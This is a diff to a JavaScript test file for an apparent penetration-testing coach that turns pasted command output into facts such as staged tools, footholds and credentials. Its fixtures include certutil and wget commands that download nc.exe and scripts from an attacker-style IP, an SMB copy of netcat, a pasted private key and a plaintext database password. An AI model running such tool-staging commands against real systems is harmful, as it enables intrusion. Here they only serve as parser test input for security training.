@@ -18,7 +18,8 @@ var by = {}; A.forEach(function (m) { by[m.id] = m; });
 req('assets/engine/parsers/common.js');
 ['nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource', 'findings', 'shape', 'pivot', 'dns', 'blockers', 'nxc-catalog'].forEach(function (m) { req('assets/engine/parsers/' + m + '.js'); });
 req('assets/engine/parsers/index.js');
-req('data/field-notes.js');   // OBOL.FIELD_DOCTORS — the reactive fix-cards surfaced on a failed-command paste
+req('data/parser-signatures.js');
+req('data/field-notes.js');   // OBOL.FIELD_DOCTORS: the reactive fix-cards surfaced on a failed-command paste
 
 var fail = 0;
 function ok(c, m) { if (!c) { console.error('  FAIL:', m); fail++; } else { console.log('  ok  :', m); } }
@@ -31,18 +32,45 @@ ok(prod('lsass-dump-onbox').indexOf('credential.available') >= 0, 'an LSASS dump
   ok(prod(id).indexOf('credential.available') >= 0, id + ' produces a usable credential');
 });
 // nosql-injection is a WEB auth bypass, not an OS win: it must NOT claim access.admin or a validated
-// credential — only the app-level bypass and candidate material it can extract (gate-audit, web batch).
+// credential: only the app-level bypass and candidate material it can extract (gate-audit, web batch).
 ok(prod('nosql-injection').indexOf('access.admin') < 0, 'nosql-injection does NOT claim access.admin (app bypass, not OS win)');
 ok(prod('nosql-injection').indexOf('web.authz_bypass') >= 0 && prod('nosql-injection').indexOf('credential.candidate') >= 0, 'nosql-injection produces web.authz_bypass + credential.candidate (honest)');
 ok(prod('manual-sqli-exploitation').indexOf('credential.candidate') >= 0, 'SQLi-dumped creds enter the crack/reuse loop (credential.candidate)');
 // Loot value-chain: pulling a file a share-spider flagged and pasting it must mint the fact that lights the
-// NEXT move — a found-then-pasted thing generates the follow-up, not a dead end.
+// NEXT move: a found-then-pasted thing generates the follow-up, not a dead end.
 var pem = run('cat id_rsa', '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----');
 ok(pem.indexOf('credential.certificate') >= 0, 'a pasted private key mints credential.certificate (→ ssh-key-login)');
 ok([].concat(by['ssh-key-login'].requires_all || [], by['ssh-key-login'].requires_any || []).indexOf('credential.certificate') >= 0, 'ssh-key-login consumes credential.certificate (the key chains to a foothold)');
 var cfg = run('cat web.config', '<add name="db" connectionString="Server=sql;Initial Catalog=app;User Id=sa;Password=P@ssw0rd123;"/>');
 ok(cfg.indexOf('credential.candidate') >= 0, 'a pasted connection-string password mints credential.candidate');
 ok(run('cat notes.txt', 'notes about the meeting tomorrow, nothing secret here').length === 0, 'a plain-text paste with no secret mints nothing (no false positive)');
+// --- Outcome axis: certutil failure-doctoring (corpus-mined blocker.certutil_usage) ---
+ok(run('certutil -ca.cert ca.cer', 'CertUtil: Too many arguments\nExpected no more than 1 args, received 2').indexOf('blocker.certutil_usage') >= 0, 'a certutil usage/arg error mints blocker.certutil_usage');
+ok(run('certutil -encode f f.b64', 'CertUtil: -encode command completed successfully.').indexOf('blocker.certutil_usage') < 0, 'a certutil success line mints no blocker (no false positive)');
+ok([].concat(by['certutil-usage-doctor'].requires_all || [], by['certutil-usage-doctor'].requires_any || []).indexOf('blocker.certutil_usage') >= 0, 'certutil-usage-doctor consumes blocker.certutil_usage (the fix surfaces on the error)');
+// --- Outcome axis: a confirmed file transfer stages a tool onto the host (host.tool_staged) ---
+// The corpus "I uploaded/downloaded X and it worked" idiom used to mint nothing. A tool-specific SUCCESS
+// token now mints a terminal receipt; an in-progress/failed transfer, and a web-enum curl, stay silent.
+var cu = run('certutil -urlcache -split -f http://10.10.14.1/nc.exe nc.exe', '****  Online  ****\nCertUtil: -URLCache command completed successfully.');
+ok(cu.indexOf('host.tool_staged') >= 0, 'a certutil URLCache download success mints host.tool_staged');
+ok(run('wget http://10.10.14.1/x.sh', "Saving to: 'x.sh'\nx.sh   100%[=====>]   1.85M\n2024-01-01 (18.5 MB/s) - 'x.sh' saved [1939624/1939624]").indexOf('host.tool_staged') >= 0, 'a wget "... saved [n/n]" mints host.tool_staged');
+ok(run('scp x.sh bob@10.10.10.10:/tmp/', 'x.sh   100%  1894KB   1.8MB/s   00:01').indexOf('host.tool_staged') >= 0, 'an scp "name 100% ..." mints host.tool_staged');
+ok(run('copy \\\\10.10.14.1\\share\\nc.exe C:\\temp\\', '        1 file(s) copied.').indexOf('host.tool_staged') >= 0, 'a Windows "N file(s) copied" mints host.tool_staged');
+ok(run('certutil -urlcache -split -f http://10.10.14.1/nc.exe nc.exe', 'CertUtil: The system cannot find the file specified. 0x80070002').indexOf('host.tool_staged') < 0, 'a failed certutil transfer mints no host.tool_staged');
+ok(run('curl -s http://10.10.10.10/', '<html><body>100 reasons to visit, 100% off</body></html>').indexOf('host.tool_staged') < 0, 'a web-enum curl mints no host.tool_staged (no false positive)');
+// host.tool_staged is a terminal host. receipt (report fact), so it must NOT create a wiring dead-end or
+// orphan; the gap-report gauntlet enforces that, this just pins the kind as registered + labelled.
+ok(OBOL.PARSER_SIGNATURES && JSON.stringify(OBOL.PARSER_SIGNATURES.files.emits).indexOf('host.tool_staged') >= 0, 'host.tool_staged is registered under the files lens');
+ok(OBOL.pack.FRIENDLY['host.tool_staged'], 'host.tool_staged has a FRIENDLY label');
+// --- State-change axis: a bare Windows `whoami` identity now mints a foothold (parity with `id`) ---
+// Previously a plain `whoami` returning a Windows identity minted nothing (it is not an exec-tool command),
+// while a bare `id` already minted foothold.linux. Route it to the command-execution reader so it mints
+// foothold.windows, and access.system for NT AUTHORITY\SYSTEM, without inventing a new fact kind.
+ok(run('whoami', 'acme\\administrator').indexOf('foothold.windows') >= 0, 'a bare Windows `whoami` (DOMAIN\\user) mints foothold.windows');
+var sys = run('whoami', 'nt authority\\system');
+ok(sys.indexOf('foothold.windows') >= 0 && sys.indexOf('access.system') >= 0, 'a `whoami` showing nt authority\\system mints foothold.windows + access.system');
+ok(run('whoami', 'root').indexOf('foothold.windows') < 0, 'a Linux-style `whoami` (root) mints no foothold.windows (no false positive)');
+ok(run('id', 'uid=0(root) gid=0(root) groups=0(root)').indexOf('foothold.linux') >= 0, 'a bare `id` still mints foothold.linux (unchanged parity baseline)');
 // the usable-credential fact really has downstream consumers (so the loop advances the coach)
 var consumers = A.filter(function (m) { return [].concat(m.requires_all || [], m.requires_any || []).indexOf('credential.available') >= 0; });
 ok(consumers.length >= 20, 'credential.available drives many downstream moves (' + consumers.length + ')');
